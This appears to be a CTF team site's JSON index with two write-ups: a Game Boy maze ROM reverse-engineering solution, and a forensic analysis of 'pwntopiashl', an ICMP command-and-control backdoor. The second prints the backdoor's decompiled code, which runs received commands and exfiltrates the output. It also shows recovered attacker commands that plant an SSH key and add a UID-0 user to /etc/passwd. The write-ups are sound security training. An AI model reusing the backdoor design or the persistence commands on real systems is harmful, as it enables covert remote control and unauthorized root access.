[{"content":"","date":"8 August 2025","externalUrl":null,"permalink":"/website/authors/alexis/","section":"Authors","summary":"","title":"Alexis","type":"authors"},{"content":"In this challenge, we were given the Cavormice.gb file. When using the file command, we can see that the file is a Game Boy ROM image.\n$ file Cavormice.gb Cavormice.gb: Game Boy ROM image (Rev.01) [ROM ONLY], ROM: 256Kbit The file is most likely a game so we can use a GameBoy emulator. We used mednafen to emulate the game by simply running the following command.\n$ mednafen Cavormice.gb With this information, we searched for the architecture of the GameBoy, which is Sharp SM83. Now, we wanted to find a decompiler for this architecture so we understand what is happening in the binary. We found a plugin for ghidra which worked pretty well. We also wanted to be able to do a dynamic analysis so we used BGB, which is a debugger for GameBoy.\nLet\u0026rsquo;s now analyze what is happening !\nBy running the game, we noticed that after 32 directions taken, the message You loseâ€¦ appears.\nLet\u0026rsquo;s now have a look at the code, using the plugin for GameBoy. We came across this function in the game using Ghidra.\nvoid FUN_09a7 (void) { undefined extraout_C; if ((((DAT_c806 \u0026amp; 0x80) != 0 || (byte)(DAT_c806 + (0xf \u0026lt; DAT_c805)) == \u0026#39;\\0\u0026#39;) \u0026amp;\u0026amp; (DAT_c531 == \u0026#39;a\u0026#39;)) \u0026amp;\u0026amp; (DAT_c532 == -0x3e)) { FUN_06fc(0x55); FUN_0729(); FUN_0984(extraout_C); DAT_c803 = 0x58; DAT_c804 = 0; DAT_c805 = 0x97; DAT_c806 = 0; } if ((DAT_c806 \u0026amp; 0x80) != 0 || (byte)(DAT_c806 + (0xf \u0026lt; DAT_c805)) == \u0026#39;\\0\u0026#39;) { FUN_06fc(0x55); FUN_0968(); DAT_c803 = 0x58; DAT_c804 = 0; DAT_c805 = 0x97; DAT_c806 = 0; } if ((DAT_c806 \u0026amp; 0x80) == 0 \u0026amp;\u0026amp; (DAT_c805 \u0026lt; 0x98) \u0026lt;= DAT_c806) { FUN_06fc(0x44); FUN_0968(); DAT_c803 = 0x58; DAT_c804 = 0; DAT_c805 = 0x10; DAT_c806 = 0; } if ((DAT_c804 \u0026amp; 0x80) == 0 \u0026amp;\u0026amp; (DAT_c803 \u0026lt; 0xa0) \u0026lt;= DAT_c804) { FUN_06fc(0x52); FUN_0968(); DAT_c803 = 8; DAT_c804 = 0; DAT_c805 = 0x58; DAT_c806 = 0; } if ((DAT_c804 \u0026amp; 0x80) != 0 || (byte)(DAT_c804 + (7 \u0026lt; DAT_c803)) == \u0026#39;\\0\u0026#39;) { FUN_06fc(0x4c); FUN_0968(); DAT_c803 = 0x9f; DAT_c804 = 0; DAT_c805 = 0x58; DAT_c806 = 0; return; } return; } The function FUN_06fc seems very interesting. In fact, the function is given 0x55, 0x44, 0x52, 0x4c as parameters. If we convert these values in ASCII characters, we obtain respectively U, D, R, L. These are the possible directions for each step in the labyrinth. Here is the decompilation of the function.\nvoid FUN_06fc(undefined param_1) { (\u0026amp;DAT_c808)[(char)DAT_c838] = param_1; DAT_c838 = DAT_c838 + 1; if ((DAT_c838 \u0026amp; 0x80) == 0 \u0026amp;\u0026amp; 0x20 \u0026lt; DAT_c838) { FUN_063c(); FUN_065e(); return; } return; } We see that the direction is written in DAT_c808. It seems that FUN_09a7 records the movements made in the labyrinth and using FUN_06fc. Another interesting detail about FUN_09a7 is that in the first condition, it calls for a special function which is not called in the other conditions. It also seems that this call happens when we go upwards in the labyrinth.\nundefined FUN_0729(void) { char cVar1; int iVar2; byte bVar3; DAT_c807 = 0; if (DAT_c838 == \u0026#39; \u0026#39;) { for (iVar2 = 0; bVar3 = (byte)((uint)iVar2 \u0026gt;\u0026gt; 8), (byte)(!(bool)(bVar3 \u0026gt;\u0026gt; 7) \u0026lt;\u0026lt; 7 | bVar3 \u0026amp; 0x7f) \u0026lt; (byte)(((byte)iVar2 \u0026lt; 0x10) + 0x80U); iVar2 = iVar2 + 1) { cVar1 = (byte)iVar2 * \u0026#39;\\x02\u0026#39;; if ((\u0026amp;DAT_c828)[iVar2] != ((\u0026amp;DAT_c808)[(char)(cVar1 + 1)] ^ (\u0026amp;DAT_c808)[cVar1])) { DAT_c807 = 0; return 0; } } DAT_c807 = 1; } return DAT_c807; } We can see that the function acts as a check function. The code is a bit unreadable, we deobfuscated the logic for an easier comprehension.\nbool check_function() { for (int i = 0; i \u0026lt; 16) { if (DAT_c828[i] != DAT_c808[2 * i] ^ DAT_c808[2 * i + 1]) { return false; } } return true; Interesting, we meet again DAT_c808 which contains the directions taken in the labyrinth. There is an Odd / Even iteration done on the input buffer. Values are XORed with each other. Using XOR properties, we have to retrieve DAT_c828 to retrieve the correct entries. We have to consider the fact that we are forced to start and end with the UP (U) direction because of the layout of the labyrinth, which means we can easily retrieve the values.\nWe tried to find DAT_c828 in Ghidra but we had that:\nSo we used BGB to get the value at runtime: We now create a python script using the data array we just found, and we see what are the values when we XOR two different inputs.\ndata = [0x19, 0x19, 0x8, 0x16, 0x7, 0x00, 0x19, 0x11, 0x8, 0x16, 0x11, 0x19, 0x00, 0x1E, 0x7, 0x11] direction = [\u0026#39;U\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;L\u0026#39;] for i in direction: for j in direction: if i != j: print(f\u0026#34;{i} {j}: {hex(ord(i) ^ ord(j))}\u0026#34;) which gives:\n$ python3 script.py U D: 0x11 U R: 0x7 U L: 0x19 D U: 0x11 D R: 0x16 D L: 0x8 R U: 0x7 R D: 0x16 R L: 0x1e L U: 0x19 L D: 0x8 L R: 0x1e So we just had to find the right combination to get the value wanted in the data array.\ndata = [0x19, 0x19, 0x8, 0x16, 0x7, 0x00, 0x19, 0x11, 0x8, 0x16, 0x11, 0x19, 0x00, 0x1E, 0x7, 0x11] direction = [\u0026#39;U\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;L\u0026#39;] setofdirection = {0x19: \u0026#39;UL\u0026#39;, 0x8: \u0026#39;DL\u0026#39;, 0x16: \u0026#39;DR\u0026#39;, 0x7: \u0026#39;UR\u0026#39;, 0x0: \u0026#39;SameThing\u0026#39;, 0x11: \u0026#39;DU\u0026#39;, 0x1E: \u0026#39;LR\u0026#39;} for el in data: print(f\u0026#34;{setofdirection.get(el, \u0026#39;Unknown\u0026#39;)}\u0026#34;, end=\u0026#39; \u0026#39;) which gives:\n$ python3 script.py UL UL DL DR UR SameThing UL DU DL DR DU UL SameThing LR UR DU There is also one rule we didn\u0026rsquo;t think about in our script: we need to go Down just after going Up (except for the first and the last one) because you are locked in the room after going Up: So the combination becomes:\nULLUDLRDRUDDLUDUDLDRUDLUDDLRRUDU After entering these inputs, we arrived in a room with a chest: So the flag is:\nAMSI{ULLUDLRDRUDDLUDUDLDRUDLUDDLRRUDU} ","date":"8 August 2025","externalUrl":null,"permalink":"/website/en/posts/cavormice/cavormice/","section":"Posts","summary":"","title":"AMSI CTF 2025 - Reverse Engineering - Cavormice","type":"posts"},{"content":"","date":"8 August 2025","externalUrl":null,"permalink":"/website/authors/lyes-bourennani/","section":"Authors","summary":"","title":"Lyes BOURENNANI","type":"authors"},{"content":"","date":"8 August 2025","externalUrl":null,"permalink":"/website/en/","section":"m1nds","summary":"","title":"m1nds","type":"page"},{"content":" Context # We are provided with a PCAP file and a stripped ELF x86_64 binary. We know that a machine on the network was compromised and some data was exfiltrated. We have to understand how it was done to retrieve the data and the flag. When opening the PCAP capture in Wireshark, we can see ICMP requests and responses. However some of the messages are malformed, which is suspicious.\nfile pwntopiashl capture.pcap pwntopiashl: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7ea5fda28b3a88f7a5f8cf761870503215d8aa50, for GNU/Linux 3.2.0, not stripped capture.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535) Let\u0026rsquo;s use a decompiler to see what the binary file hides. There are so security mechanisms that obfuscates the code, so the decompilation is comprehensible.\nint __fastcall __noreturn main(int argc, const char **argv, const char **envp) { unsigned int v3; // eax __int64 v4; // rdi v3 = time(0LL); v4 = v3; srand(v3); icmp_packet_listener(v4); } void __noreturn icmp_packet_listener() { size_t v0; // rbx size_t v1; // rbx size_t v2; // rbx int v3; // eax struct sockaddr addr; // [rsp+0h] [rbp-C810h] BYREF char buf[2]; // [rsp+10h] [rbp-C800h] BYREF __int16 v6; // [rsp+12h] [rbp-C7FEh] char v7[8]; // [rsp+18h] [rbp-C7F8h] BYREF __int64 v8; // [rsp+20h] [rbp-C7F0h] BYREF __int16 v9; // [rsp+38h] [rbp-C7D8h] __int16 v10; // [rsp+3Ah] [rbp-C7D6h] char v11; // [rsp+3Ch] [rbp-C7D4h] char v12; // [rsp+3Dh] [rbp-C7D3h] __int16 v13; // [rsp+3Eh] [rbp-C7D2h] char dest[25536]; // [rsp+40h] [rbp-C7D0h] BYREF char s[20]; // [rsp+6400h] [rbp-6410h] BYREF char v16; // [rsp+6414h] [rbp-63FCh] BYREF int v17; // [rsp+C7C0h] [rbp-50h] unsigned int v18; // [rsp+C7C4h] [rbp-4Ch] FILE *stream; // [rsp+C7C8h] [rbp-48h] int v20; // [rsp+C7D0h] [rbp-40h] int v21; // [rsp+C7D4h] [rbp-3Ch] char *v22; // [rsp+C7D8h] [rbp-38h] char *v23; // [rsp+C7E0h] [rbp-30h] int fd; // [rsp+C7ECh] [rbp-24h] int i; // [rsp+C7F0h] [rbp-20h] int j; // [rsp+C7F4h] [rbp-1Ch] int v27; // [rsp+C7F8h] [rbp-18h] unsigned int v28; // [rsp+C7FCh] [rbp-14h] fd = socket(2, 3, 1); if ( fd \u0026lt; 0 ) exit(1); while ( 1 ) { do memset(s, 0, 0x63C0uLL); while ( recv(fd, s, 0x63BFuLL, 0) \u0026lt;= 0 ); v23 = s; v22 = \u0026amp;v16; v21 = 28; if ( v16 == 12 \u0026amp;\u0026amp; v22[1] == 35 ) { v9 = *((_WORD *)v22 + 1); LOBYTE(v10) = rand(); HIBYTE(v10) = rand(); v11 = v9 ^ HIBYTE(v9); v12 = v10 ^ HIBYTE(v10); v13 = v9 ^ v10; memset(buf, 0, 0x20uLL); addr.sa_family = 2; *(_DWORD *)\u0026amp;addr.sa_data[2] = *((_DWORD *)v23 + 3); buf[0] = 0; v6 = v10; sleep(1u); sendto(fd, buf, v20 + 8LL, 0, \u0026amp;addr, 0x10u); } if ( *v22 == 19 \u0026amp;\u0026amp; v22[1] == 42 ) { addr.sa_family = 2; *(_DWORD *)\u0026amp;addr.sa_data[2] = *((_DWORD *)v23 + 3); memset(dest, 0, sizeof(dest)); memcpy(dest, \u0026amp;s[v21], (unsigned int)(25535 - v21)); for ( i = 25536; ; --i ) { v0 = i; if ( v0 \u0026lt; strlen(dest) || dest[i - 1] ) break; } for ( j = 0; j \u0026lt; i; ++j ) dest[j] ^= *((_BYTE *)\u0026amp;v9 + (j \u0026amp; 7)); puts(dest); fflush(_bss_start); stream = popen(dest, \u0026#34;r\u0026#34;); if ( stream ) { memset(dest, 0, sizeof(dest)); memset(s, 0, 0x63C0uLL); while ( fgets(s, 25536, stream) ) { v1 = strlen(dest); if ( v1 + strlen(s) \u0026gt; 0x63BE ) break; strcat(dest, s); } pclose(stream); i = strlen(dest); for ( j = 0; j \u0026lt; i; ++j ) dest[j] ^= *((_BYTE *)\u0026amp;v9 + (j \u0026amp; 7)); for ( i = 25536; ; --i ) { v2 = i; if ( v2 \u0026lt; strlen(dest) || dest[i - 1] ) break; } v27 = 0; v28 = i; v18 = ((unsigned __int64)i \u0026gt;\u0026gt; 4) + 1; for ( j = 0; j \u0026lt; (int)v18; ++j ) { memset(buf, 0, 0x20uLL); buf[0] = 8; v3 = v28; if ( v28 \u0026gt; 0x10 ) v3 = 16; v17 = v3; sprintf(v7, \u0026#34;%04d%04d\u0026#34;, (unsigned int)(j + 1), v18); memcpy(\u0026amp;v8, \u0026amp;dest[v27], v17); v27 += v17; v28 -= v17; sleep(1u); sendto(fd, buf, v17 + 16LL, 0, \u0026amp;addr, 0x10u); } } } } } We can clearly see that the program listens to ICMP messages. However, on certain conditions, some things are done.\nHanshake # However, it seems that there are checks on the ICMP header. If it contains certain values as header, some actions are done. Firstly, if the header is bâ€™\\x0c\\x23â€™, then we take some of the data from the message and create a cipher key with randomly generated data using the pseudo-random generator from the libc (srand(), rand()). We also see at the end that we send back the randomly generated short. This is some form of hanshake.\nif ( v16 == 12 \u0026amp;\u0026amp; v22[1] == 35 ) { v9 = *((_WORD *)v22 + 1); LOBYTE(v10) = rand(); HIBYTE(v10) = rand(); v11 = v9 ^ HIBYTE(v9); v12 = v10 ^ HIBYTE(v10); v13 = v9 ^ v10; memset(buf, 0, 0x20uLL); addr.sa_family = 2; *(_DWORD *)\u0026amp;addr.sa_data[2] = *((_DWORD *)v23 + 3); buf[0] = 0; v6 = v10; sleep(1u); sendto(fd, buf, v20 + 8LL, 0, \u0026amp;addr, 0x10u); } Command \u0026amp; Control # If the header is b'\\x13\\x2A', we see that we retrieve the data and decipher it using XOR cipher with the key generated at handshake. Then, the deciphered data is given as an argument in popen, which means deciphered data should be commands, then the output is ciphered with the same key and ready to be exfiltrated. This is some kind of Command \u0026amp; Control (C2) backdoor mechanism.\nif ( *v22 == 19 \u0026amp;\u0026amp; v22[1] == 42 ) { addr.sa_family = 2; *(_DWORD *)\u0026amp;addr.sa_data[2] = *((_DWORD *)v23 + 3); memset(dest, 0, sizeof(dest)); memcpy(dest, \u0026amp;s[v21], (unsigned int)(25535 - v21)); for ( i = 25536; ; --i ) { v0 = i; if ( v0 \u0026lt; strlen(dest) || dest[i - 1] ) break; } for ( j = 0; j \u0026lt; i; ++j ) dest[j] ^= *((_BYTE *)\u0026amp;v9 + (j \u0026amp; 7)); puts(dest); fflush(_bss_start); stream = popen(dest, \u0026#34;r\u0026#34;); if ( stream ) { memset(dest, 0, sizeof(dest)); memset(s, 0, 0x63C0uLL); while ( fgets(s, 25536, stream) ) { v1 = strlen(dest); if ( v1 + strlen(s) \u0026gt; 0x63BE ) break; strcat(dest, s); } pclose(stream); i = strlen(dest); for ( j = 0; j \u0026lt; i; ++j ) dest[j] ^= *((_BYTE *)\u0026amp;v9 + (j \u0026amp; 7)); for ( i = 25536; ; --i ) { v2 = i; if ( v2 \u0026lt; strlen(dest) || dest[i - 1] ) break; } v27 = 0; v28 = i; v18 = ((unsigned __int64)i \u0026gt;\u0026gt; 4) + 1; for ( j = 0; j \u0026lt; (int)v18; ++j ) { memset(buf, 0, 0x20uLL); buf[0] = 8; v3 = v28; if ( v28 \u0026gt; 0x10 ) v3 = 16; v17 = v3; sprintf(v7, \u0026#34;%04d%04d\u0026#34;, (unsigned int)(j + 1), v18); memcpy(\u0026amp;v8, \u0026amp;dest[v27], v17); v27 += v17; v28 -= v17; sleep(1u); sendto(fd, buf, v17 + 16LL, 0, \u0026amp;addr, 0x10u); } } Retrieval of the executed commands # Since we have the network capture, we can decipher the data and see what was done on the compromised machine. I developed a small script. We simply iterate on packets. If the packet has the key handshake header, we build the key. If it\u0026rsquo;s the command execution, we decipher the command used and its output using the current key. The script uses scapy to easily iterate on ICMP messages.\n# decode_c2_data.py from scapy.all import * from itertools import cycle def generate_xor_key(key: int, r: int) -\u0026gt; bytes: key_lo = key \u0026amp; 0xFF key_hi = (key \u0026gt;\u0026gt; 8) \u0026amp; 0xFF r_lo = r \u0026amp; 0xFF r_hi = (r \u0026gt;\u0026gt; 8) \u0026amp; 0xFF kxor = key ^ r return bytes([ key_lo, key_hi, r_lo, r_hi, key_hi ^ key_lo, r_hi ^ r_lo, kxor \u0026amp; 0xFF, (kxor \u0026gt;\u0026gt; 8) \u0026amp; 0xFF ]) def dump_data(pcap_path): packets = rdpcap(pcap_path) key = None for i in range(len(packets)): data = bytes(packets[i][ICMP]) if i != len(packets) - 1: next_data = bytes(packets[i + 1][ICMP]) if data[0:2] == b\u0026#39;\\x0c\\x23\u0026#39;: first = int.from_bytes(data[2:4], byteorder=\u0026#39;little\u0026#39;) second = int.from_bytes(next_data[2:4], byteorder=\u0026#39;little\u0026#39;) print(f\u0026#34;Key init found! first = {hex(first)} \u0026amp; second = {hex(second)}\u0026#34;) key = generate_xor_key(first, second) elif data[0:2] == b\u0026#39;\\x13\\x2A\u0026#39;: cipher = data[8:] plain = \u0026#34;\u0026#34;.join([chr(a ^ b) for a,b in zip(cipher, cycle(key))]) print(f\u0026#34;Found plain: {plain}\u0026#34;) else: cipher = data[8:] plain = \u0026#34;\u0026#34;.join([chr(a ^ b) for a,b in zip(cipher, cycle(key))]) plain = plain[8:] print(f\u0026#34;{plain}\u0026#34;) dump_data(\u0026#34;capture.pcap\u0026#34;) Here is the output of our little script :\npython3 decode_c2_data.py Key init found! first = 0xada \u0026amp; second = 0xe0de Found plain: id uid=0(root) gid= 0(root) groups=0 (root) Found plain: mkdir /root/.ssh \u0026amp;\u0026amp; echo \u0026#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCx+J8mv79rAqohohfdnzJDBS6wfnl1RT0CUeIYqqoWv7VTgiCMmmG7ww4jfWtX4IXb6KN1uO17Jpfqod0brs3QHgiwpwhGbdurPMGbZwmJaXdCbf69ZTzf1YYn9xv5SxUrlGg9/UAs2QbHPt0rcrv5Y7b47IUodm8H9P6SiVddhGIpRViToBJZ83leGaTMfH2W9moWfMtcNegNmrIc3ObfLa0/T03Ag2nwjNkoBOwbR/S5wsQYuEufDHNF4eAeWKI+UsRB19yrKOmrsrlnQ831JSiYQ5VCDcchyHW2FqEkf/LK4mBE2Y/u8etAwzgi9dVbO4dhV1cG4JdUE5X/mhphktZM0zy3/i6AstWKalDyUnKSRkFi+iAm3bj5rg6eZsbWXzoiOQHvIjBtjkTIaneufmLMqj5rNUnOgBI1glAMp5rDewqH5Wga90lddtBDN698ULoIQR+TTe/1fryGcBcKNXiRBfe2fqqK0i9wOY20xu/4tPZAilo/RQxKBXEq5gs=\u0026#39; \u0026gt; /root/.ssh/id_rsa.pub Found plain: cat /root/.ssh/id_rsa.pub ssh-rsa AAAAB3Nz aC1yc2EAAAADAQAB AAABgQCx+J8mv79r AqohohfdnzJDBS6w fnl1RT0CUeIYqqoW v7VTgiCMmmG7ww4j fWtX4IXb6KN1uO17 Jpfqod0brs3QHgiw pwhGbdurPMGbZwmJ aXdCbf69ZTzf1YYn 9xv5SxUrlGg9/UAs 2QbHPt0rcrv5Y7b4 7IUodm8H9P6SiVdd hGIpRViToBJZ83le GaTMfH2W9moWfMtc NegNmrIc3ObfLa0/ T03Ag2nwjNkoBOwb R/S5wsQYuEufDHNF 4eAeWKI+UsRB19yr KOmrsrlnQ831JSiY Q5VCDcchyHW2FqEk f/LK4mBE2Y/u8etA wzgi9dVbO4dhV1cG 4JdUE5X/mhphktZM 0zy3/i6AstWKalDy UnKSRkFi+iAm3bj5 rg6eZsbWXzoiOQHv IjBtjkTIaneufmLM qj5rNUnOgBI1glAM p5rDewqH5Wga90ld dtBDN698ULoIQR+T Te/1fryGcBcKNXiR Bfe2fqqK0i9wOY20 xu/4tPZAilo/RQxK BXEq5gs= Key init found! first = 0xff3c \u0026amp; second = 0xe8b4 Found plain: openssl passwd pwnt0p14 $1$d0QECrET$duOS z/ZMGfKaSPgyxagI n0 Found plain: echo \u0026#39;root2:$1$d0QECrET$duOSz/ZMGfKaSPgyxagIn0:0:0:root:/root:/bin/bash\u0026#39; \u0026gt;\u0026gt; /etc/passwd Found plain: tail -n 1 /etc/passwd root2:$1$d0QECrE T$duOSz/ZMGfKaSP gyxagIn0:0:0:roo t:/root:/bin/bas h Key init found! first = 0xaea \u0026amp; second = 0x44dc Found plain: pwd /tmp/pwntopia Found plain: ls -la total 44 drwxr-x r-x 2 root root 4096 Mar 10 17 :18 . drwxrwxrwt 29 root root 16 384 Mar 10 17:50 .. -rwxr-xr-x 1 root root 1688 0 Mar 10 17:49 p wntopiashl -rw-r --r-- 1 root ro ot 31 Mar 10 17:18 .secret Found plain: cat .secret | openssl enc -aes-256-cbc -a -salt -pbkdf2 -pass pass:we_pwned_nops U2FsdGVkX1+sDd5g 4JCxThLBMo/IsCKi wxriZAOdcfL7Y8ce jGFLo3jpAiyuyx7o Key init found! first = 0x3d56 \u0026amp; second = 0x7093 We can see that the attacker added persistence by adding a RSA SSH public key to the root user. Then, he created a root2 user by appending root2:$1$d0QECrET$duOSz/ZMGfKaSPgyxagIn0:0:0:root:/root:/bin/bash to /etc/passwd. We also can see that the .secret file was exfiltrated. Since we retrieved the commands, we just have to take the ciphered .secret file and decipher it using the password we_pwned_nops and openssl.\ncat \u0026gt; cipher.txt \u0026lt;\u0026lt;EOF U2FsdGVkX1+sDd5g 4JCxThLBMo/IsCKi wxriZAOdcfL7Y8ce jGFLo3jpAiyuyx7o EOF openssl enc -aes-256-cbc -d -a -salt -pbkdf2 -pass pass:we_pwned_nops -in cipher.txt N0PS{v3Ry_s734lThY_1cMP_sh3Ll} ","date":"8 August 2025","externalUrl":null,"permalink":"/website/en/posts/pwntopiashl/pwntopiashl/","section":"Posts","summary":"","title":"N0PSCTF 2025 - Reverse Engineering - pwntopiashl","type":"posts"},{"content":"","date":"8 August 2025","externalUrl":null,"permalink":"/website/en/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","externalUrl":null,"permalink":"/website/en/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/website/en/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/website/en/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/website/en/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]